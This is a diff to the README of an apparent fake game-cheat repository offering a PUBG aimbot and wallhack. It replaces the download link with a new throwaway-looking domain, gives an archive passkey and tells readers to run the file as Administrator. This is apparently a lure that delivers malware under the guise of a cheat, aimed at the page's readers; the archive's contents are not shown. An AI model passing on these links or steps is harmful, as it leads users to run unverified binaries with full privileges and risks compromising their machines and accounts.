@@ -6,7 +6,7 @@ PUBG hack with aimbot, ESP, wallhack, radar hack, no recoil, and more. For educa
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular mods like **PixelBot**, **PUBG Tool**, and **FuryAim**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch PUBG.
 4. Run the hack **as Administrator**.
